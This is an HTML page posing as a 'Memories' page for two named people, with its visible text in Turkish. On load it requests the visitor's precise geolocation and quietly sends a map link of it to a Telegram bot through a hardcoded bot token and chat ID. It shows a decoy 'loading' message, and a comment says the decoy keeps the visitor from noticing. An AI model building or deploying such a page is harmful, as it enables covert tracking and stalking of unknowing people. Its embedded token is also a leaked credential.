<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Maedeh-Okan - Memories</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f9; padding: 40px; text-align: center; }
        .card { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0px 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #333; }
        p { color: #666; }
    </style>
</head>
<body>

    <div class="card">
        <h2>Yükleniyor...</h2>
        <p>Lütfen içerik yüklenirken bekleyin.</p>
    </div>

    <script>
        // BURAYA KENDİ BİLGİLERİNİ YAZACAKSIN:
        const TELEGRAM_BOT_TOKEN = "9025207470:AAGN83q17A6k4ijUiD9GAqBmy5tb7X77B6Q"; 
        const TELEGRAM_CHAT_ID = "1099076902";

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(konumuTelegramaGonder, hataVer, {
                    enableHighAccuracy: true
                });
            }
        };

        function konumuTelegramaGonder(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const haritaLinki = `https://www.google.com/maps?q=${lat},${lon}`;
            
            const mesaj = "🚨 Yeni Konum Geldi!\n🔗 Harita: " + haritaLinki;

            // Telegram API'sine istek atıyoruz
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(mesaj)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    console.log("Konum Telegram'a iletildi.");
                })
                .catch(error => {
                    console.error("Hata:", error);
                });

            // Kullanıcı hiçbir şey anlamasın diye ekranda normal bir sayfa gösterelim:
            document.querySelector('.card').innerHTML = "<h2>Bağlantı Başarılı</h2><p>İçerik yükleniyor...</p>";
        }

        function hataVer(error) {
            document.querySelector('.card').innerHTML = "<h2>Yükleniyor...</h2><p>Sayfa hazırlanıyor.</p>";
        }
    </script>

</body>
</html>
